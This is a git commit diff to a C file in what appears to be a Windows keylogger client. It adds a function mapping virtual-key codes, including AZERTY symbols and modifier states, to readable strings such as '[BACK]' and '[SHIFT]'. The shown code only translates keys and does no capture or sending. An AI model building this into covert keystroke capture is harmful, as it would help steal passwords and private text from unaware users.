21032083366167884a1b20d064367ceec40c1956
Valeran-MAYTIE <v.maytie85@orange.fr>
2021-04-10 20:05:56 +0200

    add other key traitement

--- src_windows_client/key.c
+++ src_windows_client/key.c
@@ -7,6 +7,7 @@ char *translate_key(DWORD vkCode)
 {
     char *key = malloc(KEY_SIZE);
     memset(key, '\0', KEY_SIZE);
+
     if (vkCode > 64 && vkCode < 91)
     {
         if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLock()))
@@ -23,11 +24,26 @@ char *translate_key(DWORD vkCode)
     else if (vkCode >= VK_F1 && vkCode <= VK_F24)
         key = f_key(vkCode);
     else
-    {
-        printf("%d", vkCode);
         key = other(vkCode);
-    }
     return key;
+}
+
+char *number(DWORD vkCode)
+{
+    char *number[] = {
+        "à", "&", "é", "\"", "'", "(", "-", "è", "_", "ç"};
+    char *number_shifted[] = {
+        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"};
+
+    char *number_algr[] = {
+        "@", UK, "~", "#", "{", "[", "|", "`", "\\", "^"};
+
+    if (isCapsLock() || isShiftLock())
+        return number_shifted[vkCode - 48];
+    if (isAltgrLock())
+        return number_algr[vkCode - 48];
+    else
+        return number[vkCode - 48];
 }
 
 char *n_pad(DWORD vkCode)
@@ -50,27 +66,135 @@ char *f_key(DWORD vkCode)
     return key[vkCode - VK_F1];
 }
 
-char *number(DWORD vkCode)
-{
-    char *number[] = {
-        "à", "&", "é", "\"", "'", "(", "-", "è", "_", "ç"};
-    char *number_shifted[] = {
-        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"};
-
-    char *number_algr[] = {
-        "@", UK, "~", "#", "{", "[", "|", "`", "\\", "^"};
-
-    if (isCapsLock() || isShiftLock())
-        return number_shifted[vkCode - 48];
-    if (isAltgrLock())
-        return number_algr[vkCode - 48];
-    else
-        return number[vkCode - 48];
-}
-
 char *other(DWORD vkCode)
 {
-    return UK;
+    switch (vkCode)
+    {
+    case VK_BACK:
+        return "[BACK]";
+    case VK_TAB:
+        return "[TAB]";
+    case VK_CLEAR:
+        return "[CLEAR]";
+    case VK_RETURN:
+        return "[RETURN]";
+    case VK_SHIFT:
+        return "[SHIFT]";
+    case VK_CONTROL:
+        return "[CONTROL]";
+    case VK_MENU:
+        return "[ALT]";
+    case VK_PAUSE:
+        return "[PAUSE]";
+    case VK_CAPITAL:
+        return "[CAPITAL]";
+    case VK_ESCAPE:
+        return "[ESCAPE]";
+    case VK_SPACE:
+        return "[SPACE]";
+    case VK_PRIOR:
+        return "[PRIOR]";
+    case VK_NEXT:
+        return "[NEXT]";
+    case VK_END:
+        return "[END]";
+    case VK_HOME:
+        return "[HOME]";
+    case VK_LEFT:
+        return "[LEFT]";
+    case VK_UP:
+        return "[UP]";
+    case VK_RIGHT:
+        return "[RIGHT]";
+    case VK_DOWN:
+        return "[DOWN]";
+    case VK_SELECT:
+        return "[SELECT]";
+    case VK_PRINT:
+        return "[PRINT]";
+    case VK_EXECUTE:
+        return "[EXE]";
+    case VK_SNAPSHOT:
+        return "[SNAPSHOT]";
+    case VK_INSERT:
+        return "[INSERT]";
+    case VK_DELETE:
+        return "[DEL]";
+    case VK_HELP:
+        return "[HELP]";
+    case VK_LWIN:
+        return "[WIN]";
+    case VK_RWIN:
+        return "[WIN]";
+    case VK_APPS:
+        return "[APPS]";
+    case VK_SLEEP:
+        return "[SLEEP]";
+
+    case 0xBA:
+        if (isCapsLock() ^ isShiftLock())
+            return "£";
+        else if (isAltgrLock())
+            return "¤";
+        return "$";
+    case 0xBB:
+        if (isCapsLock() ^ isShiftLock())
+            return "+";
+        else if (isAltgrLock())
+            return "}";
+        return "=";
+    case 0xBC:
+        if (isCapsLock() ^ isShiftLock())
+            return "?";
+        return ",";
+    case 0xBE:
+        if (isCapsLock() ^ isShiftLock())
+            return ".";
+        return ";";
+    case 0xBF:
+        if (isCapsLock() ^ isShiftLock())
+            return "/";
+        return ":";
+    case 0xC0:
+        if (isCapsLock() ^ isShiftLock())
+            return "%";
+        return "ù";
+    case 0xDB:
+        if (isCapsLock() ^ isShiftLock())
+            return "°";
+        else if (isAltgrLock())
+            return "]";
+        return ")";
+    case 0xDC:
+        if (isCapsLock() ^ isShiftLock())
+            return "µ";
+        return "*";
+    case 0xDD:
+        if (isCapsLock() ^ isShiftLock())
+            return "¨";
+        return "^";
+    case 0xDF:
+        if (isCapsLock() ^ isShiftLock())
+            return "§";
+        return "!";
+
+    case VK_NUMLOCK:
+        return "[NUM_LOCK]";
+    case VK_LSHIFT:
+        return "";
+    case VK_RSHIFT:
+        return "";
+    case VK_LCONTROL:
+        return "";
+    case VK_RCONTROL:
+        return "";
+    case VK_LMENU:
+        return "";
+    case VK_RMENU:
+        return "";
+    default:
+        return UK;
+    }
 }
 
 const int isCapsLock(void)
